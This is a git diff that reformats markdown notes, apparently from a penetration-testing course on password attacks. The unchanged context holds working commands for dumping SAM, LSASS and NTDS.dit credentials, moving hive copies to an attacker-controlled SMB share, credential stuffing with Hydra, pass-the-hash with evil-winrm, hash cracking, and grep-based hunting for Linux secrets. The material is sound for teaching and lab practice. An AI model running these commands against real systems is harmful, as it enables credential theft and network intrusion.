@@ -145,15 +145,11 @@ Another interesting [statistic](https://storage.googleapis.com/gweb-uniblog-publ
 
 One aspect of this statistic that is somewhat more difficult to understand is that only 45% of Americans would change their passwords after a data breach. This, in turn, means that `55% still keep the password` even though it has already been leaked. We can also check if one of our email addresses is affected by various data breaches. One of the best-known sources for this is [HaveIBeenPwned](https://haveibeenpwned.com/). We enter an email address in the HaveIBeenPwned website, and it checks in its database if the email address has already been affected by any reported data breaches. If this is the case, we will see a list of all of the breaches in which our email address appears.
 
-***
-
 ### Digging In
 
 Now that we have defined what a password is, how we use them, and common security principles, let's dive into how we store passwords and other credentials.
 
-1. \
-   Page 2
-2. Credential Storage
+***
 
 ## Credential Storage
 
@@ -172,8 +168,6 @@ We also know that every operating system supports these types of authentication 
 As we already know, Linux-based systems handle everything in the form of a file. Accordingly, passwords are also stored encrypted in a file. This file is called the `shadow` file and is located in `/etc/shadow` and is part of the Linux user management system. In addition, these passwords are commonly stored in the form of `hashes`. An example can look like this:
 
 **Shadow File**
-
-Credential Storage
 
 ```shell-session
 root@htb:~# cat /etc/shadow
@@ -212,8 +206,6 @@ The type (`id`) is the cryptographic hash method used to encrypt the password. M
 However, a few more files belong to the user management system of Linux. The other two files are `/etc/passwd` and `/etc/group`. In the past, the encrypted password was stored together with the username in the `/etc/passwd` file, but this was increasingly recognized as a security problem because the file can be viewed by all users on the system and must be readable. The `/etc/shadow` file can only be read by the user `root`.
 
 **Passwd File**
-
-Credential Storage
 
 ```shell-session
 root@htb[/htb]$ cat /etc/passwd
@@ -259,14 +251,7 @@ Winlogon is the only process that intercepts login requests from the keyboard se
 
 [Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local\_Security\_Authority\_Subsystem\_Service) (`LSASS`) is a collection of many modules and has access to all authentication processes that can be found in `%SystemRoot%\System32\Lsass.exe`. This service is responsible for the local system security policy, user authentication, and sending security audit logs to the `Event log`. In other words, it is the vault for Windows-based operating systems, and we can find a more detailed illustration of the LSASS architecture [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961760\(v=technet.10\)?redirectedfrom=MSDN).
 
-| **Authentication Packages** | **Description**                                                                                                                                                                                                                                                |
-| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `Lsasrv.dll`                | The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful. |
-| `Msv1_0.dll`                | Authentication package for local machine logons that don't require custom authentication.                                                                                                                                                                      |
-| `Samsrv.dll`                | The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.                                                                                                                                       |
-| `Kerberos.dll`              | Security package loaded by the LSA for Kerberos-based authentication on a machine.                                                                                                                                                                             |
-| `Netlogon.dll`              | Network-based logon service.                                                                                                                                                                                                                                   |
-| `Ntdsa.dll`                 | This library is used to create new records and folders in the Windows registry.                                                                                                                                                                                |
+<table data-header-hidden><thead><tr><th width="252"></th><th></th></tr></thead><tbody><tr><td><strong>Authentication Packages</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Lsasrv.dll</code></td><td>The LSA Server service both enforces security policies and acts as the security package manager for the LSA. The LSA contains the Negotiate function, which selects either the NTLM or Kerberos protocol after determining which protocol is to be successful.</td></tr><tr><td><code>Msv1_0.dll</code></td><td>Authentication package for local machine logons that don't require custom authentication.</td></tr><tr><td><code>Samsrv.dll</code></td><td>The Security Accounts Manager (SAM) stores local security accounts, enforces locally stored policies, and supports APIs.</td></tr><tr><td><code>Kerberos.dll</code></td><td>Security package loaded by the LSA for Kerberos-based authentication on a machine.</td></tr><tr><td><code>Netlogon.dll</code></td><td>Network-based logon service.</td></tr><tr><td><code>Ntdsa.dll</code></td><td>This library is used to create new records and folders in the Windows registry.</td></tr></tbody></table>
 
 Source: [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication).
 
@@ -287,8 +272,6 @@ Microsoft introduced a security feature in Windows NT 4.0 to help improve the se
 Source: [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication).
 
 Credential Manager is a feature built-in to all Windows operating systems that allows users to save the credentials they use to access various network resources and websites. Saved credentials are stored based on user profiles in each user's `Credential Locker`. Credentials are encrypted and stored at the following location:
-
-Credential Storage
 
 ```powershell-session
 PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
@@ -360,15 +343,11 @@ Rainbow table attacks involve using a pre-computed table of hashes and their cor
 
 **Single Crack Mode**
 
-John The Ripper
-
 ```shell-session
 root@htb[/htb]$ john --format=<hash_type> <hash or hash_file>
 ```
 
 For example, if we have a file named `hashes_to_crack.txt` that contains `SHA-256` hashes, the command to crack them would be:
-
-John The Ripper
 
 ```shell-session
 root@htb[/htb]$ john --format=sha256 hashes_to_crack.txt
@@ -454,8 +433,6 @@ John will output the cracked passwords to the console and the file "john.pot" (`
 
 `Wordlist Mode` is used to crack passwords using multiple lists of words. It is a dictionary attack which means it will try all the words in the lists one by one until it finds the right one. It is generally used for cracking multiple password hashes using a wordlist or a combination of wordlists. It is more effective than Single Crack Mode because it utilizes more words but is still relatively basic. The basic syntax for the command is:
 
-John The Ripper
-
 ```shell-session
 root@htb[/htb]$ john --wordlist=<wordlist_file> --rules <hash_file>
 ```
@@ -469,8 +446,6 @@ First, we specify the wordlist file or files to use for cracking the password ha
 The syntax for running John the Ripper in incremental mode is as follows:
 
 **Incremental Mode in John**
-
-John The Ripper
 
 ```shell-session
 root@htb[/htb]$ john --incremental <hash_file>
@@ -486,8 +461,6 @@ It is also possible to crack even password-protected or encrypted files with Joh
 
 **Cracking Files with John**
 
-John The Ripper
-
 ```shell-session
 cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
 cry0l1t3@htb:~$ pdf2john server_doc.pdf > server_doc.hash
@@ -498,26 +471,9 @@ cry0l1t3@htb:~$ john --wordlist=<wordlist.txt> server_doc.hash
 
 Additionally, we can use different modes for this with our personal wordlists and rules. We have created a list that includes many but not all tools that can be used for John:
 
-| **Tool**                | **Description**                               |
-| ----------------------- | --------------------------------------------- |
-| `pdf2john`              | Converts PDF documents for John               |
-| `ssh2john`              | Converts SSH private keys for John            |
-| `mscash2john`           | Converts MS Cash hashes for John              |
-| `keychain2john`         | Converts OS X keychain files for John         |
-| `rar2john`              | Converts RAR archives for John                |
-| `pfx2john`              | Converts PKCS#12 files for John               |
-| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
-| `keepass2john`          | Converts KeePass databases for John           |
-| `vncpcap2john`          | Converts VNC PCAP files for John              |
-| `putty2john`            | Converts PuTTY private keys for John          |
-| `zip2john`              | Converts ZIP archives for John                |
-| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
-| `office2john`           | Converts MS Office documents for John         |
-| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |
+<table data-header-hidden><thead><tr><th width="292"></th><th></th></tr></thead><tbody><tr><td><strong>Tool</strong></td><td><strong>Description</strong></td></tr><tr><td><code>pdf2john</code></td><td>Converts PDF documents for John</td></tr><tr><td><code>ssh2john</code></td><td>Converts SSH private keys for John</td></tr><tr><td><code>mscash2john</code></td><td>Converts MS Cash hashes for John</td></tr><tr><td><code>keychain2john</code></td><td>Converts OS X keychain files for John</td></tr><tr><td><code>rar2john</code></td><td>Converts RAR archives for John</td></tr><tr><td><code>pfx2john</code></td><td>Converts PKCS#12 files for John</td></tr><tr><td><code>truecrypt_volume2john</code></td><td>Converts TrueCrypt volumes for John</td></tr><tr><td><code>keepass2john</code></td><td>Converts KeePass databases for John</td></tr><tr><td><code>vncpcap2john</code></td><td>Converts VNC PCAP files for John</td></tr><tr><td><code>putty2john</code></td><td>Converts PuTTY private keys for John</td></tr><tr><td><code>zip2john</code></td><td>Converts ZIP archives for John</td></tr><tr><td><code>hccap2john</code></td><td>Converts WPA/WPA2 handshake captures for John</td></tr><tr><td><code>office2john</code></td><td>Converts MS Office documents for John</td></tr><tr><td><code>wpa2john</code></td><td>Converts WPA/WPA2 handshakes for John</td></tr></tbody></table>
 
 More of these tools can be found on `Pwnbox` in the following way:
-
-John The Ripper
 
 ```shell-session
 root@htb[/htb]$ locate *2john*
@@ -1149,15 +1105,11 @@ We can imagine that we have found some applications used in the network by our c
 
 **Credential Stuffing - Hydra Syntax**
 
-Password Reuse / Default Passwords
-
 ```shell-session
 root@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
 ```
 
 **Credential Stuffing - Hydra**
-
-Password Reuse / Default Passwords
 
 ```shell-session
 root@htb[/htb]$ hydra -C user_pass.list ssh://10.129.42.197
@@ -1194,19 +1146,13 @@ With access to a non-domain joined Windows system, we may benefit from attemptin
 
 There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:
 
-| Registry Hive   | Description                                                                                                                                                |
-| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
-| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
-| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |
+<table><thead><tr><th width="197">Registry Hive</th><th>Description</th></tr></thead><tbody><tr><td><code>hklm\sam</code></td><td>Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.</td></tr><tr><td><code>hklm\system</code></td><td>Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.</td></tr><tr><td><code>hklm\security</code></td><td>Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</td></tr></tbody></table>
 
 We can create backups of these hives using the `reg.exe` utility.
 
 **Using reg.exe save to Copy Registry Hives**
 
 Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:
-
-Attacking SAM
 
 ```cmd-session
 C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
@@ -1228,8 +1174,6 @@ Technically we will only need `hklm\sam` & `hklm\system`, but `hklm\security` ca
 
 All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (`CompData`) and specify the directory on our attack host where the share will be storing the hive copies (`/home/ltnbob/Documents`). Know that the `smb2support` option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the [numerous severe vulnerabilites](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.
 
-Attacking SAM
-
 ```shell-session
 root@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
 
@@ -1247,8 +1191,6 @@ Once we have the share running on our attack host, we can use the `move` command
 
 **Moving Hive Copies to Share**
 
-Attacking SAM
-
 ```cmd-session
 C:\> move sam.save \\10.10.15.16\CompData
         1 file(s) moved.
@@ -1264,8 +1206,6 @@ Then we can confirm that our hive copies successfully moved to the share by navi
 
 **Confirming Hive Copies Transferred to Attack Host**
 
-Attacking SAM
-
 ```shell-session
 root@htb[/htb]$ ls
 
@@ -1280,8 +1220,6 @@ One incredibly useful tool we can use to dump the hashes offline is Impacket's `
 
 **Locating secretsdump.py**
 
-Attacking SAM
-
 ```shell-session
 root@htb[/htb]$ locate secretsdump 
 ```
@@ -1289,8 +1227,6 @@ root@htb[/htb]$ locate secretsdump
 Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.
 
 **Running secretsdump.py**
-
-Attacking SAM
 
 ```shell-session
 root@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
@@ -1324,8 +1260,6 @@ NL$KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f
 
 Here we see that secretsdump successfully dumps the `local` SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the `system bootkey` before proceeding to dump the `LOCAL SAM hashes`. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:
 
-Attacking SAM
-
 ```shell-session
 Dumping local SAM hashes (uid:rid:lmhash:nthash)
 ```
@@ -1344,8 +1278,6 @@ As mentioned previously, we can populate a text file with the NT hashes we were 
 
 **Adding nthashes to a .txt File**
 
-Attacking SAM
-
 ```shell-session
 root@htb[/htb]$ sudo vim hashestocrack.txt
 
@@ -1361,8 +1293,6 @@ Now that the NT hashes are in our text file (`hashestocrack.txt`), we can use Ha
 **Running Hashcat against NT Hashes**
 
 Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using `-m` to select the hash type `1000` to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example\_hashes) or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the `Credential Storage` section of this module.
-
-Attacking SAM
 
 ```shell-session
 root@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
@@ -1414,8 +1344,6 @@ With access to credentials with `local admin privileges`, it is also possible fo
 
 **Dumping LSA Secrets Remotely**
 
-Attacking SAM
-
 ```shell-session
 root@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 
@@ -1432,8 +1360,6 @@ SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bo
 **Dumping SAM Remotely**
 
 We can also dump hashes from the SAM database remotely.
-
-Attacking SAM
 
 ```shell-session
 root@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
@@ -1485,8 +1411,6 @@ With access to an interactive graphical session with the target, we can use task
 
 A file called `lsass.DMP` is created and saved in:
 
-Attacking LSASS
-
 ```cmd-session
 C:\Users\loggedonusersdirectory\AppData\Local\Temp
 ```
@@ -1502,8 +1426,6 @@ Before issuing the command to create the dump file, we must determine what proce
 **Finding LSASS PID in cmd**
 
 From cmd, we can issue the command `tasklist /svc` and find lsass.exe and its process ID in the PID field.
-
-Attacking LSASS
 
 ```cmd-session
 C:\Windows\system32> tasklist /svc
@@ -1530,8 +1452,6 @@ fontdrvhost.exe                812 N/A
 
 From PowerShell, we can issue the command `Get-Process lsass` and see the process ID in the `Id` field.
 
-Attacking LSASS
-
 ```powershell-session
 PS C:\Windows\system32> Get-Process lsass
 
@@ -1545,8 +1465,6 @@ Once we have the PID assigned to the LSASS process, we can create the dump file.
 **Creating lsass.dmp using PowerShell**
 
 With an elevated PowerShell session, we can issue the following command to create the dump file:
-
-Attacking LSASS
 
 ```powershell-session
 PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
@@ -1569,8 +1487,6 @@ Recall that LSASS stores credentials that have active logon sessions on Windows 
 **Running Pypykatz**
 
 The command initiates the use of `pypykatz` to parse the secrets hidden in the LSASS process memory dump. We use `lsa` in the command because LSASS is a subsystem of `local security authority`, then we specify the data source as a `minidump` file, proceeded by the path to the dump file (`/home/peter/Documents/lsass.dmp`) stored on our attack host. Pypykatz parses the dump file and outputs the findings:
-
-Attacking LSASS
 
 ```shell-session
 root@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
@@ -1667,8 +1583,6 @@ Lets take a more detailed look at some of the useful information in the output.
 
 **MSV**
 
-Attacking LSASS
-
 ```shell-session
 sid S-1-5-21-4019466498-1700476312-3544718034-1001
 luid 1354633
@@ -1685,8 +1599,6 @@ luid 1354633
 
 **WDIGEST**
 
-Attacking LSASS
-
 ```shell-session
 	== WDIGEST [14ab89]==
 		username bob
@@ -1699,8 +1611,6 @@ Attacking LSASS
 
 **Kerberos**
 
-Attacking LSASS
-
 ```shell-session
 	== Kerberos ==
 		Username: bob
@@ -1710,8 +1620,6 @@ Attacking LSASS
 [Kerberos](https://web.mit.edu/kerberos/#what\_is) is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.
 
 **DPAPI**
-
-Attacking LSASS
 
 ```shell-session
 	== DPAPI [14ab89]==
@@ -1723,21 +1631,13 @@ Attacking LSASS
 
 The Data Protection Application Programming Interface or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:
 
-| Applications                | Use of DPAPI                                                                                |
-| --------------------------- | ------------------------------------------------------------------------------------------- |
-| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
-| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
-| `Outlook`                   | Passwords for email accounts.                                                               |
-| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
-| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |
+<table><thead><tr><th width="341">Applications</th><th>Use of DPAPI</th></tr></thead><tbody><tr><td><code>Internet Explorer</code></td><td>Password form auto-completion data (username and password for saved sites).</td></tr><tr><td><code>Google Chrome</code></td><td>Password form auto-completion data (username and password for saved sites).</td></tr><tr><td><code>Outlook</code></td><td>Passwords for email accounts.</td></tr><tr><td><code>Remote Desktop Connection</code></td><td>Saved credentials for connections to remote machines.</td></tr><tr><td><code>Credential Manager</code></td><td>Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.</td></tr></tbody></table>
 
 Mimikatz and Pypykatz can extract the DPAPI `masterkey` for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) module.
 
 **Cracking the NT Hash with Hashcat**
 
 Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the `Attacking SAM` section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.
-
-Attacking LSASS
 
 ```shell-session
 root@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
@@ -1794,8 +1694,6 @@ Let's say we have done our research and gathered a list of names based on public
 
 We can create a custom list on our attack host using the names above. We can use a command line-based text editor like `Vim` or a graphical text editor to create our list. Our list may look something like this:
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 root@htb[/htb]$ cat usernames.txt 
 bwilliamson
@@ -1815,8 +1713,6 @@ stevenson.jim
 Of course, this is just an example and doesn't include all of the names, but notice how we can include a different naming convention for each name if we do not already know the naming convention used by the target organization.
 
 We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:
-
-Attacking Active Directory & NTDS.dit
 
 ```shell-session
 root@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
@@ -1903,8 +1799,6 @@ It is ideal to limit the need to guess as much as possible when conducting passw
 
 Once we have our list(s) prepared or discover the naming convention and some employee names, we can launch our attack against the target domain controller using a tool such as CrackMapExec. We can use it in conjunction with the SMB protocol to send logon requests to the target Domain Controller. Here is the command to do so:
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 root@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 
@@ -1939,8 +1833,6 @@ Once we have discovered some credentials, we could proceed to try to gain remote
 
 We can connect to a target DC using the credentials we captured.
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 root@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 ```
@@ -1950,8 +1842,6 @@ Evil-WinRM connects to a target using the Windows Remote Management service comb
 **Checking Local Group Membership**
 
 Once connected, we can check to see what privileges `bwilliamson` has. We can start with looking at the local group membership using the command:
-
-Attacking Active Directory & NTDS.dit
 
 ```shell-session
 *Evil-WinRM* PS C:\> net localgroup
@@ -1999,8 +1889,6 @@ We are looking to see if the account has local admin rights. To make a copy of t
 
 **Checking User Account Privileges including Domain**
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 *Evil-WinRM* PS C:\> net user bwilliamson
 
@@ -2037,8 +1925,6 @@ This account has both Administrators and Domain Administrator rights which means
 
 We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the C: drive or whatever volume the admin chose when initially installing AD. It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location. We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down. VSS is used by many different backup & disaster recovery software to perform operations.
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
 
@@ -2054,8 +1940,6 @@ Successfully created shadow copy for 'C:\'
 
 We can then copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to our attack host.
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 
@@ -2068,8 +1952,6 @@ Before copying NTDS.dit to our attack host, we may want to use the technique we 
 
 Now `cmd.exe /c move` can be used to move the file from the target DC to the share on our attack host.
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
 
@@ -2079,8 +1961,6 @@ Attacking Active Directory & NTDS.dit
 **A Faster Method: Using cme to Capture NTDS.dit**
 
 Alternatively, we may benefit from using CrackMapExec to accomplish the same steps shown above, all with one command. This command allows us to utilize VSS to quickly capture and dump the contents of the NTDS.dit file conveniently within our terminal session.
-
-Attacking Active Directory & NTDS.dit
 
 ```shell-session
 root@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
@@ -2129,8 +2009,6 @@ We can proceed with creating a text file containing all the NT hashes, or we can
 
 **Cracking a Single Hash with Hashcat**
 
-Attacking Active Directory & NTDS.dit
-
 ```shell-session
 root@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 
@@ -2148,8 +2026,6 @@ In many of the techniques we have covered so far, we have had success in crackin
 We can still use hashes to attempt to authenticate with a system using a type of attack called `Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work:
 
 **Pass-the-Hash with Evil-WinRM Example**
-
-Attacking Active Directory & NTDS.dit
 
 ```shell-session
 root@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
@@ -2203,8 +2079,6 @@ Once Lazagne.exe is on the target, we can open command prompt or PowerShell, nav
 
 **Running Lazagne All**
 
-Credential Hunting in Windows
-
 ```cmd-session
 C:\Users\bob\Desktop> start lazagne.exe all
 ```
@@ -2212,8 +2086,6 @@ C:\Users\bob\Desktop> start lazagne.exe all
 This will execute Lazagne and run `all` included modules. We can include the option `-vv` to study what it is doing in the background. Once we hit enter, it will open another prompt and display the results.
 
 **Lazagne Output**
-
-Credential Hunting in Windows
 
 ```cmd-session
 |====================================================================|
@@ -2241,8 +2113,6 @@ If we used the `-vv` option, we would see attempts to gather passwords from all 
 **Using findstr**
 
 We can also use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:
-
-Credential Hunting in Windows
 
 ```cmd-session
 C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
@@ -2303,8 +2173,6 @@ The most crucial part of any system enumeration is to obtain an overview of it. 
 
 **Configuration Files**
 
-Credential Hunting in Linux
-
 ```shell-session
 cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
 
@@ -2347,8 +2215,6 @@ Optionally, we can save the result in a text file and use it to examine the indi
 
 **Credentials in Configuration Files**
 
-Credential Hunting in Linux
-
 ```shell-session
 cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
 
@@ -2381,8 +2247,6 @@ File:  /etc/mysql/conf.d/mysql.cnf
 We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.
 
 **Databases**
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
@@ -2428,8 +2292,6 @@ Depending on the environment we are in and the purpose of the host we are on, we
 
 **Notes**
 
-Credential Hunting in Linux
-
 ```shell-session
 cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 
@@ -2444,8 +2306,6 @@ cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
 Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.
 
 **Scripts**
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
@@ -2480,8 +2340,6 @@ File extension:  .sh
 Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.
 
 **Cronjobs**
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ cat /etc/crontab 
@@ -2538,8 +2396,6 @@ Since the SSH keys can be named arbitrarily, we cannot search them for specific 
 
 **SSH Private Keys**
 
-Credential Hunting in Linux
-
 ```shell-session
 cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
 
@@ -2547,8 +2403,6 @@ cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
 ```
 
 **SSH Public Keys**
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
@@ -2565,8 +2419,6 @@ All history files provide crucial information about the current and past/histori
 In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.
 
 **Bash History**
-
-Credential Hunting in Linux
 
 ```shell-session
 cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*
@@ -2612,8 +2464,6 @@ Many different logs exist on the system. These can vary depending on the applica
 
 Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:
 
-Credential Hunting in Linux
-
 ```shell-session
 cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
 
@@ -2636,8 +2486,6 @@ cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "acc
 Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.
 
 **Memory - Mimipenguin**
-
-Credential Hunting in Linux
